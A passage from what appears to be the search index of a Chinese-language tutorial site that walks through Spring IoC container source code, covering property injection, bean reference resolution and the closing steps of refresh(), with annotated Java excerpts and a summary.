applyPropertyValues\u200b\u65b9\u6cd5\u200b\u7684\u200b\u5177\u4f53\u200b\u4ee3\u7801\u200b\u5728\u200b\u4e0b\u9762\u200b\n        applyPropertyValues(beanName, mbd, bw, pvs);\n    }\n}\n\n// \u200b\u4e0a\u9762\u200b\u65b9\u6cd5\u200b\u4e2d\u200b\u8c03\u7528\u200b\u7684\u200bapplyPropertyValues\u200b\u65b9\u6cd5\u200b\u5177\u4f53\u200b\u4ee3\u7801\u200b\nprotected void applyPropertyValues(String beanName, BeanDefinition mbd, BeanWrapper bw, PropertyValues pvs) {\n    if (pvs.isEmpty()) {\n        return;\n    }\n\n    if (System.getSecurityManager() != null &amp;&amp; bw instanceof BeanWrapperImpl) {\n        ((BeanWrapperImpl) bw).setSecurityContext(getAccessControlContext());\n    }\n\n    MutablePropertyValues mpvs = null;\n    List&lt;PropertyValue&gt; original;\n\n    if (pvs instanceof MutablePropertyValues) {\n        mpvs = (MutablePropertyValues) pvs;\n        if (mpvs.isConverted()) {\n            // Shortcut: use the pre-converted values as-is.\n            try {\n                bw.setPropertyValues(mpvs);\n                return;\n            }\n            catch (BeansException ex) {\n                throw new BeanCreationException(\n                        mbd.getResourceDescription(), beanName, \"Error setting property values\", ex);\n            }\n        }\n        original = mpvs.getPropertyValueList();\n    }\n    else {\n        original = Arrays.asList(pvs.getPropertyValues());\n    }\n\n    TypeConverter converter = getCustomTypeConverter();\n    if (converter == null) {\n        converter = bw;\n    }\n    BeanDefinitionValueResolver valueResolver = new BeanDefinitionValueResolver(this, beanName, mbd, converter);\n\n    // Create a deep copy, resolving any references for values.\n    List&lt;PropertyValue&gt; deepCopy = new ArrayList&lt;&gt;(original.size());\n    boolean resolveNecessary = false;\n    for (PropertyValue pv : original) {\n        if (pv.isConverted()) {\n            deepCopy.add(pv);\n        }\n        else {\n            String propertyName = pv.getName();\n            Object originalValue = pv.getValue();\n            if (originalValue == AutowiredPropertyMarker.INSTANCE) {\n                Method writeMethod = bw.getPropertyDescriptor(propertyName).getWriteMethod();\n                if (writeMethod == null) {\n                    throw new IllegalArgumentException(\"Autowire marker for property without write method: \" + pv);\n                }\n                originalValue = new DependencyDescriptor(new MethodParameter(writeMethod, 0), true);\n            }\n            // \u200b\u83b7\u53d6\u200bproperty\u200b\u5bf9\u5e94\u200b\u7684\u200b\u503c\u200b   resolveValueIfNecessary\u200b\u65b9\u6cd5\u200b\u7684\u200b\u4ee3\u7801\u200b\u5728\u200b\u4e0b\u9762\u200b\u7ed9\u51fa\u200b\n            Object resolvedValue = valueResolver.resolveValueIfNecessary(pv, originalValue);\n            Object convertedValue = resolvedValue;\n            boolean convertible = bw.isWritableProperty(propertyName) &amp;&amp;\n                    !PropertyAccessorUtils.isNestedOrIndexedProperty(propertyName);\n            if (convertible) {\n                convertedValue = convertForProperty(resolvedValue, propertyName, bw, converter);\n            }\n            // Possibly store converted value in merged bean definition,\n            // in order to avoid re-conversion for every created bean instance.\n            if (resolvedValue == originalValue) {\n                if (convertible) {\n                    pv.setConvertedValue(convertedValue);\n                }\n                deepCopy.add(pv);\n            }\n            else if (convertible &amp;&amp; originalValue instanceof TypedStringValue &amp;&amp;\n                    !((TypedStringValue) originalValue).isDynamic() &amp;&amp;\n                    !(convertedValue instanceof Collection || ObjectUtils.isArray(convertedValue))) {\n                pv.setConvertedValue(convertedValue);\n                deepCopy.add(pv);\n            }\n            else {\n                resolveNecessary = true;\n                deepCopy.add(new PropertyValue(pv, convertedValue));\n            }\n        }\n    }\n    if (mpvs != null &amp;&amp; !resolveNecessary) {\n        mpvs.setConverted();\n    }\n\n    // Set our (possibly massaged) deep copy.\n    try {\n        // \u200b\u83b7\u53d6\u200b\u5230\u200b\u4f9d\u8d56\u200b\u7684\u200b\u5bf9\u8c61\u200b\u503c\u540e\u200b \u200b\u5c06\u200b\u4f9d\u8d56\u200b\u503c\u200b\u6ce8\u5165\u200b\n        bw.setPropertyValues(new MutablePropertyValues(deepCopy));\n    }\n    catch (BeansException ex) {\n        throw new BeanCreationException(\n                mbd.getResourceDescription(), beanName, \"Error setting property values\", ex);\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#33","title":"##############################################################################################################################################33","text":"","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#valueresolverresolvevalueifnecessarypv-originalvalue","title":"valueResolver.resolveValueIfNecessary(pv, originalValue);\u200b\u5bf9\u5e94\u200b\u7684\u200b\u65b9\u6cd5","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b\uff1aorg.springframework.beans.factory.support.BeanDefinitionValueResolver Java<pre><code>@Nullable\npublic Object resolveValueIfNecessary(Object argName, @Nullable Object value) {\n    // We must check each value to see whether it requires a runtime reference\n    // to another bean to be resolved.\n    if (value instanceof RuntimeBeanReference) {\n        RuntimeBeanReference ref = (RuntimeBeanReference) value;\n        // \u200b\u6838\u5fc3\u200b\u903b\u8f91\u200b \u200b\u89e3\u51b3\u200bBean\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b \u200b\u5177\u4f53\u200b\u4ee3\u7801\u200b\u5728\u200b\u4e0b\u65b9\u200b\u8d34\u200b\u51fa\u200b\n        return resolveReference(argName, ref);\n    }\n    else if (value instanceof RuntimeBeanNameReference) {\n        String refName = ((RuntimeBeanNameReference) value).getBeanName();\n        refName = String.valueOf(doEvaluate(refName));\n        if (!this.beanFactory.containsBean(refName)) {\n            throw new BeanDefinitionStoreException(\n                    \"Invalid bean name '\" + refName + \"' in bean reference for \" + argName);\n        }\n        return refName;\n    }\n    else if (value instanceof BeanDefinitionHolder) {\n        // Resolve BeanDefinitionHolder: contains BeanDefinition with name and aliases.\n        BeanDefinitionHolder bdHolder = (BeanDefinitionHolder) value;\n        return resolveInnerBean(argName, bdHolder.getBeanName(), bdHolder.getBeanDefinition());\n    }\n    else if (value instanceof BeanDefinition) {\n        // Resolve plain BeanDefinition, without contained name: use dummy name.\n        BeanDefinition bd = (BeanDefinition) value;\n        String innerBeanName = \"(inner bean)\" + BeanFactoryUtils.GENERATED_BEAN_NAME_SEPARATOR +\n                ObjectUtils.getIdentityHexString(bd);\n        return resolveInnerBean(argName, innerBeanName, bd);\n    }\n    else if (value instanceof DependencyDescriptor) {\n        Set&lt;String&gt; autowiredBeanNames = new LinkedHashSet&lt;&gt;(4);\n        Object result = this.beanFactory.resolveDependency(\n                (DependencyDescriptor) value, this.beanName, autowiredBeanNames, this.typeConverter);\n        for (String autowiredBeanName : autowiredBeanNames) {\n            if (this.beanFactory.containsBean(autowiredBeanName)) {\n                this.beanFactory.registerDependentBean(autowiredBeanName, this.beanName);\n            }\n        }\n        return result;\n    }\n    else if (value instanceof ManagedArray) {\n        // May need to resolve contained runtime references.\n        ManagedArray array = (ManagedArray) value;\n        Class&lt;?&gt; elementType = array.resolvedElementType;\n        if (elementType == null) {\n            String elementTypeName = array.getElementTypeName();\n            if (StringUtils.hasText(elementTypeName)) {\n                try {\n                    elementType = ClassUtils.forName(elementTypeName, this.beanFactory.getBeanClassLoader());\n                    array.resolvedElementType = elementType;\n                }\n                catch (Throwable ex) {\n                    // Improve the message by showing the context.\n                    throw new BeanCreationException(\n                            this.beanDefinition.getResourceDescription(), this.beanName,\n                            \"Error resolving array type for \" + argName, ex);\n                }\n            }\n            else {\n                elementType = Object.class;\n            }\n        }\n        return resolveManagedArray(argName, (List&lt;?&gt;) value, elementType);\n    }\n    else if (value instanceof ManagedList) {\n        // May need to resolve contained runtime references.\n        return resolveManagedList(argName, (List&lt;?&gt;) value);\n    }\n    else if (value instanceof ManagedSet) {\n        // May need to resolve contained runtime references.\n        return resolveManagedSet(argName, (Set&lt;?&gt;) value);\n    }\n    else if (value instanceof ManagedMap) {\n        // May need to resolve contained runtime references.\n        return resolveManagedMap(argName, (Map&lt;?, ?&gt;) value);\n    }\n    else if (value instanceof ManagedProperties) {\n        Properties original = (Properties) value;\n        Properties copy = new Properties();\n        original.forEach((propKey, propValue) -&gt; {\n            if (propKey instanceof TypedStringValue) {\n                propKey = evaluate((TypedStringValue) propKey);\n            }\n            if (propValue instanceof TypedStringValue) {\n                propValue = evaluate((TypedStringValue) propValue);\n            }\n            if (propKey == null || propValue == null) {\n                throw new BeanCreationException(\n                        this.beanDefinition.getResourceDescription(), this.beanName,\n                        \"Error converting Properties key/value pair for \" + argName + \": resolved to null\");\n            }\n            copy.put(propKey, propValue);\n        });\n        return copy;\n    }\n    else if (value instanceof TypedStringValue) {\n        // Convert value to target type here.\n        TypedStringValue typedStringValue = (TypedStringValue) value;\n        Object valueObject = evaluate(typedStringValue);\n        try {\n            Class&lt;?&gt; resolvedTargetType = resolveTargetType(typedStringValue);\n            if (resolvedTargetType != null) {\n                return this.typeConverter.convertIfNecessary(valueObject, resolvedTargetType);\n            }\n            else {\n                return valueObject;\n            }\n        }\n        catch (Throwable ex) {\n            // Improve the message by showing the context.\n            throw new BeanCreationException(\n                    this.beanDefinition.getResourceDescription(), this.beanName,\n                    \"Error converting typed String value for \" + argName, ex);\n        }\n    }\n    else if (value instanceof NullBean) {\n        return null;\n    }\n    else {\n        return evaluate(value);\n    }\n}\n\n\n// \u200b\u4e0a\u9762\u200bresolveValueIfNecessary\u200b\u65b9\u6cd5\u200b\u4e2d\u200b\u8c03\u7528\u200b\u7684\u200bresolveReference\u200b\u65b9\u6cd5\u200b\n// \u200b\u6700\u540e\u200b\u83b7\u53d6\u200b\u5230\u200b\u4f9d\u8d56\u200b\u7684\u200bbean\n@Nullable\nprivate Object resolveReference(Object argName, RuntimeBeanReference ref) {\n    try {\n        Object bean;\n        Class&lt;?&gt; beanType = ref.getBeanType();\n        if (ref.isToParent()) {\n            BeanFactory parent = this.beanFactory.getParentBeanFactory();\n            if (parent == null) {\n                throw new BeanCreationException(\n                        this.beanDefinition.getResourceDescription(), this.beanName,\n                        \"Cannot resolve reference to bean \" + ref +\n                                \" in parent factory: no parent factory available\");\n            }\n            if (beanType != null) {\n                // \u200b\u53d1\u751f\u200b\u9012\u5f52\u200b\u8c03\u7528\u200b\n                bean = parent.getBean(beanType);\n            }\n            else {\n                // \u200b\u53d1\u751f\u200b\u9012\u5f52\u200b\u8c03\u7528\u200b \u200b\u6839\u636e\u200b\u4f9d\u8d56\u200b\u7684\u200b\u540d\u79f0\u200b\u4ece\u200bBeanFactory\u200b\u4e2d\u200b\u9012\u5f52\u200b\u5f97\u5230\u200b\u4f9d\u8d56\u200b \u200b\u6700\u540e\u200b\u83b7\u53d6\u200b\u5230\u200b\u4f9d\u8d56\u200b\u7684\u200bbean\n                bean = parent.getBean(String.valueOf(doEvaluate(ref.getBeanName())));\n            }\n        }\n        else {\n            String resolvedName;\n            if (beanType != null) {\n                NamedBeanHolder&lt;?&gt; namedBean = this.beanFactory.resolveNamedBean(beanType);\n                bean = namedBean.getBeanInstance();\n                resolvedName = namedBean.getBeanName();\n            }\n            else {\n                resolvedName = String.valueOf(doEvaluate(ref.getBeanName()));\n                bean = this.beanFactory.getBean(resolvedName);\n            }\n            this.beanFactory.registerDependentBean(resolvedName, this.beanName);\n        }\n        if (bean instanceof NullBean) {\n            bean = null;\n        }\n        return bean;\n    }\n    catch (BeansException ex) {\n        throw new BeanCreationException(\n                this.beanDefinition.getResourceDescription(), this.beanName,\n                \"Cannot resolve reference to bean '\" + ref.getBeanName() + \"' while setting \" + argName, ex);\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#abstractpropertyaccessorsetpropertyvaluespropertyvalues-pvs","title":"AbstractPropertyAccessor\u200b\u7684\u200bsetPropertyValues(PropertyValues pvs)\u200b\u65b9\u6cd5","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b\uff1aorg.springframework.beans.AbstractPropertyAccessor</li> <li>\u200b\u5faa\u73af\u200b\u5c5e\u6027\u200b\u5217\u8868\u200b  Java<pre><code>@Override\npublic void setPropertyValues(PropertyValues pvs) throws BeansException {\n    setPropertyValues(pvs, false, false);\n}\n\n//  \u200b\u5faa\u73af\u200b\u5c5e\u6027\u200b\u5217\u8868\u200b \n@Override\npublic void setPropertyValues(PropertyValues pvs, boolean ignoreUnknown, boolean ignoreInvalid)\n        throws BeansException {\n\n    List&lt;PropertyAccessException&gt; propertyAccessExceptions = null;\n    List&lt;PropertyValue&gt; propertyValues = (pvs instanceof MutablePropertyValues ?\n            ((MutablePropertyValues) pvs).getPropertyValueList() : Arrays.asList(pvs.getPropertyValues()));\n    // \u200b\u5faa\u73af\u200b\u5c5e\u6027\u200b\u5217\u8868\u200b \n    for (PropertyValue pv : propertyValues) {\n        try {\n            // This method may throw any BeansException, which won't be caught\n            // here, if there is a critical failure such as no matching field.\n            // We can attempt to deal only with less serious exceptions.\n            // \u200b\u8be5\u200b\u65b9\u6cd5\u200b\u901a\u8fc7\u200bAbstractNestablePropertyAccessor\u200b\u7684\u200bsetPropertyValue(PropertyValue pv)\u200b\u65b9\u6cd5\u200b\u5b9e\u73b0\u200b\n            setPropertyValue(pv);\n        }\n        catch (NotWritablePropertyException ex) {\n            if (!ignoreUnknown) {\n                throw ex;\n            }\n            // Otherwise, just ignore it and continue...\n        }\n        catch (NullValueInNestedPathException ex) {\n            if (!ignoreInvalid) {\n                throw ex;\n            }\n            // Otherwise, just ignore it and continue...\n        }\n        catch (PropertyAccessException ex) {\n            if (propertyAccessExceptions == null) {\n                propertyAccessExceptions = new ArrayList&lt;&gt;();\n            }\n            propertyAccessExceptions.add(ex);\n        }\n    }\n\n    // If we encountered individual exceptions, throw the composite exception.\n    if (propertyAccessExceptions != null) {\n        PropertyAccessException[] paeArray = propertyAccessExceptions.toArray(new PropertyAccessException[0]);\n        throw new PropertyBatchUpdateException(paeArray);\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#abstractnestablepropertyaccessor-setpropertyvaluepropertyvalue-pv","title":"AbstractNestablePropertyAccessor\u200b\u7684\u200b setPropertyValue(PropertyValue pv)\u200b\u65b9\u6cd5","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b\uff1aorg.springframework.beans.AbstractNestablePropertyAccessor Java<pre><code>@Override\n    public void setPropertyValue(PropertyValue pv) throws BeansException {\n        PropertyTokenHolder tokens = (PropertyTokenHolder) pv.resolvedTokens;\n        if (tokens == null) {\n            String propertyName = pv.getName();\n            AbstractNestablePropertyAccessor nestedPa;\n            try {\n                nestedPa = getPropertyAccessorForPropertyPath(propertyName);\n            }\n            catch (NotReadablePropertyException ex) {\n                throw new NotWritablePropertyException(getRootClass(), this.nestedPath + propertyName,\n                        \"Nested property in path '\" + propertyName + \"' does not exist\", ex);\n            }\n            tokens = getPropertyNameTokens(getFinalPath(nestedPa, propertyName));\n            if (nestedPa == this) {\n                pv.getOriginalPropertyValue().resolvedTokens = tokens;\n            }\n            nestedPa.setPropertyValue(tokens, pv);\n        }\n        else {\n            setPropertyValue(tokens, pv);\n        }\n    }\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#_7","title":"Spring-IoC\u200b\u5bb9\u5668\u200b\u6e90\u7801\u200b\u5bfc\u8bfb","text":"<ul> <li>\u200b\u4e0a\u9762\u200bsetPropertyValue(PropertyValue pv)\u200b\u65b9\u6cd5\u200b\u7684\u200b\u91cd\u8f7d\u200b\u65b9\u6cd5\u200bsetPropertyValue(PropertyTokenHolder tokens, PropertyValue pv) Java<pre><code>protected void setPropertyValue(PropertyTokenHolder tokens, PropertyValue pv) throws BeansException {\n    if (tokens.keys != null) {\n        processKeyedProperty(tokens, pv);\n    }\n    else {\n        processLocalProperty(tokens, pv);\n    }\n}\n</code></pre></li> <li>processLocalProperty(PropertyTokenHolder tokens, PropertyValue pv)\u200b\u65b9\u6cd5\u200b Java<pre><code>private void processLocalProperty(PropertyTokenHolder tokens, PropertyValue pv) {\n    PropertyHandler ph = getLocalPropertyHandler(tokens.actualName);\n    if (ph == null || !ph.isWritable()) {\n        if (pv.isOptional()) {\n            if (logger.isDebugEnabled()) {\n                logger.debug(\"Ignoring optional value for property '\" + tokens.actualName +\n                        \"' - property not found on bean class [\" + getRootClass().getName() + \"]\");\n            }\n            return;\n        }\n        else {\n            throw createNotWritablePropertyException(tokens.canonicalName);\n        }\n    }\n\n    Object oldValue = null;\n    try {\n        Object originalValue = pv.getValue();//\n        Object valueToApply = originalValue;//\n        if (!Boolean.FALSE.equals(pv.conversionNecessary)) {\n            if (pv.isConverted()) {\n                valueToApply = pv.getConvertedValue();\n            }\n            else {\n                if (isExtractOldValueForEditor() &amp;&amp; ph.isReadable()) {\n                    try {\n                        oldValue = ph.getValue();\n                    }\n                    catch (Exception ex) {\n                        if (ex instanceof PrivilegedActionException) {\n                            ex = ((PrivilegedActionException) ex).getException();\n                        }\n                        if (logger.isDebugEnabled()) {\n                            logger.debug(\"Could not read previous value of property '\" +\n                                    this.nestedPath + tokens.canonicalName + \"'\", ex);\n                        }\n                    }\n                }\n                valueToApply = convertForProperty(\n                        tokens.canonicalName, oldValue, originalValue, ph.toTypeDescriptor());\n            }\n            pv.getOriginalPropertyValue().conversionNecessary = (valueToApply != originalValue);\n        }\n        ph.setValue(valueToApply);// \u200b\u5177\u4f53\u200b\u4ee3\u7801\u200b\u5728\u200b\u4e0b\u65b9\u200b\u5217\u51fa\u200b\n    }\n    catch (TypeMismatchException ex) {\n        throw ex;\n    }\n    catch (InvocationTargetException ex) {\n        PropertyChangeEvent propertyChangeEvent = new PropertyChangeEvent(\n                getRootInstance(), this.nestedPath + tokens.canonicalName, oldValue, pv.getValue());\n        if (ex.getTargetException() instanceof ClassCastException) {\n            throw new TypeMismatchException(propertyChangeEvent, ph.getPropertyType(), ex.getTargetException());\n        }\n        else {\n            Throwable cause = ex.getTargetException();\n            if (cause instanceof UndeclaredThrowableException) {\n                // May happen e.g. with Groovy-generated methods\n                cause = cause.getCause();\n            }\n            throw new MethodInvocationException(propertyChangeEvent, cause);\n        }\n    }\n    catch (Exception ex) {\n        PropertyChangeEvent pce = new PropertyChangeEvent(\n                getRootInstance(), this.nestedPath + tokens.canonicalName, oldValue, pv.getValue());\n        throw new MethodInvocationException(pce, ex);\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#_8","title":"Spring-IoC\u200b\u5bb9\u5668\u200b\u6e90\u7801\u200b\u5bfc\u8bfb","text":"<ul> <li>\u200b\u4e0a\u8ff0\u200bph.setValue\u200b\u65b9\u6cd5\u200b\u5728\u200borg.springframework.beans.AbstractNestablePropertyAccessor\u200b\u62bd\u8c61\u7c7b\u200b\u4e2d\u200b\u5b9a\u4e49\u200b</li> <li>public abstract void setValue(@Nullable Object value) throws Exception; </li> <li>\u200b\u4e00\u4e2a\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\u5728\u200borg.springframework.beans.BeanWrapperImp\u200b\u7684\u200b\u5185\u90e8\u200b\u7c7b\u200bBeanPropertyHandler\u200b\u4e2d\u200b\uff0c\u200b\u5b8c\u6574\u200b\u4ee3\u7801\u200b\u5982\u4e0b\u200b\uff1a Java<pre><code>private final PropertyDescriptor pd;  //BeanPropertyHandler\u200b\u4e2d\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\n\n@Override\npublic void setValue(final @Nullable Object value) throws Exception {\n    final Method writeMethod = (this.pd instanceof GenericTypeAwarePropertyDescriptor ?\n            ((GenericTypeAwarePropertyDescriptor) this.pd).getWriteMethodForActualAccess() :\n            this.pd.getWriteMethod());// \u200b\u627e\u5230\u200b\u5c5e\u6027\u200b\u7684\u200bset\u200b\u65b9\u6cd5\u200b\n    if (System.getSecurityManager() != null) {\n        AccessController.doPrivileged((PrivilegedAction&lt;Object&gt;) () -&gt; {\n            ReflectionUtils.makeAccessible(writeMethod);\n            return null;\n        });\n        try {\n            AccessController.doPrivileged((PrivilegedExceptionAction&lt;Object&gt;) () -&gt;\n                    writeMethod.invoke(getWrappedInstance(), value), acc);\n                    // \u200b\u8c03\u7528\u200bMethod\u200b\u7684\u200binvoke\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u5b8c\u6210\u200b\u5c5e\u6027\u200b\u6ce8\u5165\u200b\n        }\n        catch (PrivilegedActionException ex) {\n            throw ex.getException();\n        }\n    }\n    else {\n        ReflectionUtils.makeAccessible(writeMethod);\n        writeMethod.invoke(getWrappedInstance(), value);//\u200b\u8c03\u7528\u200bMethod\u200b\u7684\u200binvoke\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u5b8c\u6210\u200b\u5c5e\u6027\u200b\u6ce8\u5165\u200b\n    }\n}\n</code></pre></li> <li>\u200b\u81f3\u6b64\u200bIoc\u200b\u5bb9\u5668\u200b\u7684\u200b\u542f\u52a8\u200b\u8fc7\u7a0b\u200b\u57fa\u672c\u200b\u7ed3\u675f\u200b</li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#15-finishrefresh","title":"15. finishRefresh();\u200b\u65b9\u6cd5","text":"<ul> <li>org.springframework.context.support.AbstractApplicationContext\u200b\u4e2d\u200b\u7684\u200bfinishRefresh()\u200b\u65b9\u6cd5\u200b</li> </ul> Java<pre><code>protected void finishRefresh() {\n    // Clear context-level resource caches (such as ASM metadata from scanning).\n    clearResourceCaches();\n\n    // Initialize lifecycle processor for this context.\n    initLifecycleProcessor();\n\n    // Propagate refresh to lifecycle processor first.\n    getLifecycleProcessor().onRefresh();\n\n    // Publish the final event.\n    publishEvent(new ContextRefreshedEvent(this));\n\n    // Participate in LiveBeansView MBean, if active.\n    LiveBeansView.registerApplicationContext(this);\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#16refresh","title":"16refresh()\u200b\u8fc7\u7a0b\u200b\u629b\u51fa\u200b\u5f02\u5e38\u200b\u65f6","text":"<ul> <li>\u200b\u4e4b\u4e2d\u200b\u6709\u200b\u4e24\u4e2a\u200b\u5904\u7406\u200b\u65b9\u6cd5\u200bdestroyBeans()\u200b\u548c\u200bcancelRefresh(ex)</li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#161-destroybeans","title":"16.1 destroyBeans();\u200b\u65b9\u6cd5","text":"<ul> <li>org.springframework.context.support.AbstractApplicationContext\u200b\u4e2d\u200b\u7684\u200bdestroyBeans()\u200b\u65b9\u6cd5\u200b</li> </ul> Java<pre><code>protected void destroyBeans() {\n    getBeanFactory().destroySingletons();\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#162-cancelrefreshex","title":"16.2 cancelRefresh(ex);\u200b\u65b9\u6cd5","text":"<ul> <li>org.springframework.context.support.AbstractApplicationContext\u200b\u4e2d\u200b\u7684\u200bcancelRefresh(ex)\u200b\u65b9\u6cd5\u200b Java<pre><code>protected void cancelRefresh(BeansException ex) {\n    this.active.set(false);\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#163beansexception","title":"16.3\u200b\u629b\u51fa\u200b\u5f02\u5e38\u200bBeansException","text":"","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#17-resetcommoncaches","title":"17 resetCommonCaches();\u200b\u65b9\u6cd5","text":"<ul> <li>org.springframework.context.support.AbstractApplicationContext\u200b\u4e2d\u200b\u7684\u200bresetCommonCaches()\u200b\u65b9\u6cd5\u200b</li> <li>try-catch-finally\u200b\u4ee3\u7801\u200b\u5757\u200b\u4e2d\u200bfinally\u200b\u5305\u88f9\u200b\u7684\u200b\u65b9\u6cd5\u200b Java<pre><code>protected void resetCommonCaches() {\n    ReflectionUtils.clearCache();\n    AnnotationUtils.clearCache();\n    ResolvableType.clearCache();\n    CachedIntrospectionResults.clearClassLoader(getClassLoader());\n}\n</code></pre></li> <li>\u200b\u6267\u884c\u200b\u5230\u200b\u6b64\u200bIoc\u200b\u5bb9\u5668\u200b\u542f\u52a8\u200b\u5b8c\u6210\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6b63\u5f0f\u200b\u6295\u5165\u4f7f\u7528\u200b</li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#_9","title":"\u603b\u7ed3","text":"<ul> <li>Ioc\u200b\u7684\u200b\u5e95\u5c42\u200b\u539f\u7406\u200b\u5b9e\u73b0\u200b\uff1aSpring Ioc\u200b\u542f\u52a8\u200b\u5206\u4e3a\u200b\u4e24\u6b65\u200b\uff1a<ul> <li>1.\u200b\u521b\u5efa\u200bBeanFactory</li> <li>2.\u200b\u5b9e\u4f8b\u200b\u5316\u200bBean</li> </ul> </li> <li>Spring\u200b\u7684\u200bBean\u200b\u5728\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u72b6\u6001\u200b\u5c31\u662f\u200bBeanDefination</li> <li>\u200b\u5728\u200bBean\u200b\u7684\u200b\u521b\u5efa\u200b\u548c\u200b\u4f9d\u8d56\u200b\u6ce8\u5165\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\uff0c\u200b\u9700\u8981\u200b\u6839\u636e\u200bBeanDefination\u200b\u7684\u200b\u4fe1\u606f\u200b\u6765\u200b\u9012\u5f52\u200b\u7684\u200b\u5b8c\u6210\u200b\u4f9d\u8d56\u200b\u6ce8\u5165\u200b\uff0c\u200b\u4ece\u200b\u4ee3\u7801\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u8fd9\u4e9b\u200b\u9012\u5f52\u200b\u90fd\u200b\u662f\u200b\u4ee5\u200bgetBean()\u200b\u4e3a\u200b\u5165\u53e3\u200b\u7684\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u9012\u5f52\u200b\u662f\u200b\u5728\u200b\u4e0a\u4e0b\u6587\u200b\u4f53\u7cfb\u200b\u4e2d\u200b\u67e5\u627e\u200b\u9700\u8981\u200b\u7684\u200bbean\u200b\u548c\u200bbean\u200b\u7684\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b\uff1b\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u9012\u5f52\u200b\u662f\u200b\u5728\u200b\u4f9d\u8d56\u200b\u6ce8\u5165\u200b\u65f6\u200b\uff0c\u200b\u901a\u8fc7\u200b\u9012\u5f52\u200b\u8c03\u7528\u200b\u5bb9\u5668\u200b\u7684\u200bgetBean\u200b\u65b9\u6cd5\u200b\u5f97\u5230\u200b\u5f53\u524d\u200b\u4f9d\u8d56\u200b\u7684\u200bBean\uff0c\u200b\u540c\u65f6\u200b\u4e5f\u200b\u89e6\u53d1\u200b\u5bf9\u200b\u4f9d\u8d56\u200bbean\u200b\u7684\u200b\u521b\u5efa\u200b\u548c\u200b\u6ce8\u5165\u200b\u3002\u200b\u5728\u200b\u5bf9\u200bbean\u200b\u7684\u200b\u5c5e\u6027\u200b\u8fdb\u884c\u200b\u4f9d\u8d56\u200b\u6ce8\u5165\u200b\u65f6\u200b\uff0c\u200b\u89e3\u6790\u200b\u8fc7\u7a0b\u200b\u4e5f\u200b\u662f\u200b\u4e00\u4e2a\u200b\u9012\u5f52\u200b\u8fc7\u7a0b\u200b\uff0c\u200b\u8fd9\u6837\u200b\u6839\u636e\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b\uff0c\u200b\u4e00\u5c42\u200b\u4e00\u5c42\u200b\u7684\u200b\u5b8c\u6210\u200bBean\u200b\u7684\u200b\u521b\u5efa\u200b\u548c\u200b\u6ce8\u5165\u200b\uff0c\u200b\u76f4\u5230\u200b\u5f53\u524d\u200bbean\u200b\u76f8\u5173\u200b\u7684\u200b\u6574\u4e2a\u200b\u4f9d\u8d56\u200b\u94fe\u200b\u7684\u200b\u6ce8\u5165\u200b\u5b8c\u6210\u200b\u3002\u200b\u7531\u4e8e\u200b\u6574\u4e2a\u200bIoC\u200b\u5bb9\u5668\u200b\u542f\u52a8\u200b\u8fc7\u7a0b\u200b\u8f83\u4e3a\u200b\u590d\u6742\u200b\uff0c\u200b\u4f7f\u7528\u200b\u4e0b\u9762\u200b\u7684\u200b\u4e00\u5f20\u200b\u56fe\u6765\u200b\u63cf\u8ff0\u200b\u8ba9\u200b\u8bfb\u8005\u200b\u66f4\u200b\u6e05\u695a\u200b\u5398\u6e05\u200bIoC\u200b\u5bb9\u5668\u200b\u7684\u200b\u542f\u52a8\u200b\u8fc7\u7a0b\u200b\u3002</li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#_10","title":"\u6a21\u677f","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b:org.springframework.context.support.AbstractApplicationContext.java Java<pre><code>protected void postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory) {\n\n}\n</code></pre></li> <li> <p>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b:org.springframework.context.support.AbstractApplicationContext.java Java<pre><code>\n</code></pre></p> </li> <li> <p>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b:.java Java<pre><code>\n</code></pre></p> </li> <li> <p>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b:.java Java<pre><code>\n</code></pre></p> </li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#_11","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> 